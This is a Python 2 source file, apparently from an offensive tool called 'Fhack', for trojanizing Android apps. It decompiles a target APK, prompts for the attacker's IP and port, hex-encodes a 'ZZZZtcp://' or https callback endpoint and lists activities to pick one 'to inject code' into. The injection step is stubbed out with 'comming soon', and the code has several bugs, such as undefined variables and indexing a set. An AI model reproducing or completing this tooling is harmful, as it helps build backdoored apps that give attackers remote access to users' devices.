try:
    import src.libs as lib
    import sys, os
    from src.Colors import TextColor
    import subprocess as subproc
    from time import sleep
except Exception as error:
    raise SystemExit, '\033[31m' + '%s' % error + "\033[0m"

decomOutPutPath = os.getcwd() + "/outputs/Malwares/"

define_ENDPOINTIP = ""
define_ENDPOINTPORT = ""
define_IncomPalm = ""
define_httpsCOM = ""
define_hexEndPoint = ""


def Decompile():
    print
    print TextColor.WARNING + "[+] Decompiling TARGET -- Please wait" + TextColor.WHITE

    command = ['apktool', '--version']
    # Check that apktool is install in system
    process = subproc.Popen(command, stdout=subproc.PIPE, stderr=subproc.PIPE)
    apktoolVersion, error = process.communicate()

    if "2." not in apktoolVersion:
        raise SystemExit, TextColor.RED + "[-] You do not have  << apktool >> please install it from setup.py" + \
                          TextColor.WHITE
    else:

        define_ENDPOINTIP = raw_input(TextColor.CVIOLET + '~/Fhack/# Enter your RHOST(Your IP): ' + TextColor.WHITE)

        define_ENDPOINTPORT = int(
            raw_input(TextColor.CVIOLET + "~/Fhack/# Enter your RPORT(Your PORT): " + TextColor.WHITE))

        if define_ENDPOINTPORT > 65535:
            raise SystemExit, TextColor.RED + "We have not port bigger than 65535 ... !" + TextColor.WHITE

        apkPath = raw_input(TextColor.CVIOLET + "~/Fhack/# Enter apk(application) full path: " + TextColor.WHITE)

        print
        print TextColor.WARNING + "---------- Starting the process ----------"
        sleep(1)
        print TextColor.CYAN + "[+] Endpoint Ip set as: %s" % define_ENDPOINTIP + TextColor.WHITE
        sleep(.5)
        print TextColor.CYAN + "[+] Endpoint Port set as: %s" % define_ENDPOINTPORT + TextColor.WHITE
        sleep(.5)
        print TextColor.WHITESMOKE + "[*] Please wait to complete this step"

        # Decompiling application with apk tool
        outPutApkDirectory = (apkPath.split('/')[-1]).split('.')[0]
        command = ["apktool", "d", "-f", apkPath,
                   '-o', decomOutPutPath + "CreateMalware/Android/" + outPutApkDirectory]
        process = subproc.Popen(command, stdout=subproc.PIPE, stderr=subproc.PIPE)
        result = process.communicate()[0]  # end decompiling

        if "error" in result:
            raise SystemExit, TextColor.RED + "[-] APKTool have error on decompiling: %s" % result + TextColor.WHITE
            print
        else:
            print TextColor.GREEN + "[+] APKTool Decompile was success"
            return decomOutPutPath + "CreateMalware/Android/" + outPutApkDirectory


def ByteReadyHttpsCOMM():
    print TextColor.WHITESMOKE + "[*] Byting in https comms" + TextColor.WHITE

    global define_httpsCOM
    define_httpsCOM = 1
    endPoint = "ZZZZhttps://" + endpointIP + ":" + endpointPort + \
               "/qFTHTkSl1FhadlllA0gBcg882wlHLDmhMn6j1_ykMcArMkXkE-KOQ3RV-W7JtI5nf7x65a3fwcw" \
               "gLEPvnCgmeb2f0m-VVEm_qAMZzFhGdNn8F46OtF_FJAP1b1AjG5x8X-GGH-rekgabzOzEMkQkgqYuUl"
    endpointLength = len(endPoint)

    global define_IncomPalm
    define_IncomPalm = hex(endpointLength)

    global define_hexEndPoint
    for val in endPoint:
        define_hexEndPoint += hex(ord(val)) + "\n\t\t"


def ByteReadyTCPCOMM():
    print TextColor.WHITESMOKE + "[+] Byting in tcp comms" + TextColor.WHITE

    endPoint = "ZZZZtcp://" + define_ENDPOINTIP + ":" + str(define_ENDPOINTPORT)
    endpointLength = len(endPoint)

    global define_IncomPalm
    global define_httpsCOM
    global define_hexEndPoint

    define_httpsCOM = 0

    define_IncomPalm = hex(endpointLength)

    for val in endPoint:
        define_hexEndPoint += hex(ord(val)) + "\n\t\t"


def ParseAndManifest(decompilePath):
    print TextColor.WHITESMOKE + "[*] Looking for android manifest file" + TextColor.WHITE

    listOfManifests = list()

    # searching for manifests file
    for (dirpath, dirnames, filenames) in os.walk(decompilePath):
        for filename in filenames:
            if filename.find('AndroidManifest.xml') is not -1:
                listOfManifests.append(dirpath + "/" + filename)
    # done

    sleep(1)
    print TextColor.GREEN + "[+] Android manifest file Found" + TextColor.WHITE

    list_activities = set()
    for item in listOfManifests:
        with open(item, 'r') as file:
            for line in file.readlines():
                if line.strip('\n').find("<activity") is not -1:
                    list_activities.add(line.strip('\n').strip(' '))
                else:
                    continue

    print TextColor.WHITESMOKE + "[*] Looking for activities that apk has" + TextColor.WHITE
    # searching for all activites that android app use

    mainActivity = ""
    listOfActivities = set()

    for item in list_activities:
        if item.startswith("<activity-alias"):
            # androidname = item[item.find('android:name='):]
            androidtargetActivity = item[item.find('android:targetActivity'):]
            #
            # listOfActivities.add(androidname.split('android:name=')[1].split("\"")[1])
            mainActivity = androidtargetActivity.split('android:targetActivity=')[1].split("\"")[1]
        else:
            activity = item[item.find('android:name='):]
            listOfActivities.add(str(activity.split('android:name=')[1].split('\"')[1]))

    counter = 0
    make_table = lib.mytable(['Count', 'Name', "Root"])
    for item in listOfActivities:
        if counter == 0:
            make_table.add_row([str(counter), mainActivity, "yes"])
        else:
            make_table.add_row([str(counter), item, "no"])
        counter += 1
    print TextColor.CYELLOW + str(make_table) + TextColor.WHITE + "\n"

    selected = int(raw_input(TextColor.CVIOLET + '~ Fhack/# Which activity that you wanna inject code: '
                                                            + TextColor.WHITE))

    if selected == 0:
        return mainActivity
    else:
        try:
            return listOfActivities[selected]
        except IndexError as error:
            raise SystemExit, "%s => Please item in above list" % error
        except Exception as error:
            raise SystemExit, "%s" % error

def InjectCode():

    print 'comming soon please wait'
    return

    global define_ENDPOINTPORT, define_ENDPOINTIP

    if not os.path.exists(decomOutPutPath):
        os.mkdir(decomOutPutPath)

    decompileDir = Decompile()  # first we decompile the target apk

    # now we must ready comms to connect apk to one of them
    try:
        if "https" in define_ENDPOINTIP:
            ByteReadyHttpsCOMM()
        else:
            ByteReadyTCPCOMM()
    except Exception as error:
        raise SystemExit, TextColor.RED + "%s" % error + TextColor.WHITE

    # now we must pase android manifest of application then inject code to it
    try:
        selectedActivity = ParseAndManifest(decompileDir)
    except Exception as error:
        raise SystemError, TextColor.RED + 'We have error on parsing android manifest as: %s' % error + TextColor.WHITE

    # we got wherever that attacker want to inject code
    print decompileDir + "/smali/" + selectedActivity.replace('.', '/') + ".smali"


if __name__ == "__main__":
    InjectCode()
